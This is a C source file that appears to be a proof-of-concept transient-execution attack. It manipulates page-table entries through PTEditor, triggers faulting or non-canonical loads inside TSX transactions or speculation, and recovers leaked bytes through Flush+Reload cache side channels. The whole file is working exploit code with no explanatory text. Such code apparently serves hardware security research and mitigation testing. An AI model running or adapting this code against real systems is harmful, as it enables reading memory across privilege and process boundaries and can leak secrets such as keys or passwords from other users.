#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <memory.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include "../../cacheutils.h"
#include "../../PTEditor/ptedit_header.h"


#define PAGE_SIZE    4096

unsigned char __attribute__((aligned(PAGE_SIZE))) oracle1[256 * PAGE_SIZE];
unsigned char __attribute__((aligned(PAGE_SIZE))) oracle2[256 * PAGE_SIZE];
unsigned char __attribute__((aligned(PAGE_SIZE))) oracle3[256 * PAGE_SIZE];
unsigned char __attribute__((aligned(PAGE_SIZE))) read_page[4096 * 64];
unsigned char __attribute__((aligned(PAGE_SIZE))) dummy_page[4096 * 64];


void transient();

void * noncanon = (void*)0x5678ff0000000000ull, 
     * nulladdr = (void*)NULL,
     * ptr_read, * ptr_write, *ptr_target;

    
uint64_t shift = 0;
     

void setup_oracle(){
  memset(oracle1, 0, sizeof(oracle1));
  memset(oracle2, 0, sizeof(oracle2));
  memset(oracle3, 0, sizeof(oracle3));
  
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);
}


void setup_fh(){
  signal(SIGSEGV, trycatch_segfault_handler); 
  signal(SIGFPE, trycatch_segfault_handler);
}


#if SUP_SPECUL
uint8_t  __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];
void speculate_transient(int run) {
  flush(&run); 
  for (int i = 0; i < 8; i++) {
      flush(throttle + i * 4096);
  }
  if((run / 2.0 / throttle[0] / throttle[4096] / throttle[8192] / throttle[3 * 4096]) >
      (throttle[4 * 4096] / throttle[5 * 4096] / throttle[6 * 4096] / throttle[7 * 4096])) 
  {
      transient();
  }    
}
#endif


int main(int argc, char *argv[1]){

  setup_oracle();
  setup_fh();
  ptedit_init();  

  #if SUP_SPECUL
  for (int i = 0; i < 8; i++) {
    throttle[i * 4096] = 1;
  }
  #endif
  
    
  memset(read_page, 0, PAGE_SIZE);
  memset(dummy_page, 0, PAGE_SIZE);


  ptr_target = read_page;

  #if FAULTASSIST_S
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_USER);
  #elif FAULTASSIST_P
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_PRESENT);
  #elif FAULTASSIST_A
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_ACCESSED);
  #elif FAULTASSIST_NONCAN
  ptr_target = noncanon;
  #endif
  ptedit_cleanup();

  if(argc > 1)
    shift = atoi(argv[1]);

  int c = 0; 

  char * str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  ptr_write = dummy_page;

  while(1){
    asm volatile(
        "mov %2, %%r11\n"        
        "mov %%r11, %%rcx\n"
        "mov %0, %%rsi\n"
        "mov %1, %%rdi\n"
        "rep movsb\n"        
      : : "r"(dummy_page), "r"(dummy_page), "r"(strlen(str)): "r11");

    // By changing the offset we can index to read different values    
    ptr_read = ptr_target + 0; 
  
    if (xbegin() == (~0u)) {
      maccess(0);      
      maccess(0);
      maccess(0);

  
      transient();
      xend();
  
    }
  
    for (int i = '0' ; i <= 'z'; i++) {
      if (flush_reload((uint8_t*) oracle1 + 4096 * i)) {                    
        for (int j = '0' ; j <= 'z'; j++) {
          if (flush_reload((uint8_t*) oracle2 + 4096 * j)) {
            for (int k = '0' ; k <= 'z'; k++) {
              if (flush_reload((uint8_t*) oracle3 + 4096 * k)) {
                fprintf(stdout, "%02x%02x%02x\n", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                // fprintf(stdout, "%c%c%c\n", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                fflush(stdout);      
                c++;          
              }
            }
          }
        }
      }          
    }

    mfence();

    if(c >= atoi(argv[2])){
      break;
    }

  }
}

inline void  transient(){
  asm volatile(
    "mov (%0), %%rbx\n"
    "mov (%1), %%rax\n"
    "movb $0x41, (%%rax)\n"
    "mov %2, %%rcx\n"    
    "vmovups 1(%%rbx), %%ymm0\n"
    // "vextracti128 $0, %%ymm0, %%xmm0\n"    
    "vperm2i128 $0, %%ymm0, %%ymm0, %%ymm0\n"
//     "vzeroupper\n"
    // "vpsrldq $8, %%ymm0, %%ymm0\n"
    "vpextrq $1, %%xmm0, %%rax\n"
    // "movq %%xmm0, %%rax\n"
    
    "shr %%cl, %%rax\n"

    "mov %%rax, %%rbx\n"
    "mov %%rax, %%rcx\n"
    "and $0xff, %%rax\n"
    "shlq $12, %%rax\n"
    "movb (%3,%%rax,1), %%al\n"

    "shr $8, %%rbx\n"
    "and $0xff, %%rbx\n"            
    "shlq $12, %%rbx\n"
    "movb (%4,%%rbx,1), %%al\n"
    
    "shr $16, %%rcx\n"
    "and $0xff, %%rcx\n"            
    "shlq $12, %%rcx\n"
    "movb (%5,%%rcx,1), %%al\n"        

  : : "r"(&ptr_read), "r"(&ptr_write), "r"(shift), "r"(oracle1), "r"(oracle2), "r"(oracle3): 
      "rax", "rbx", "rcx", "memory");
}

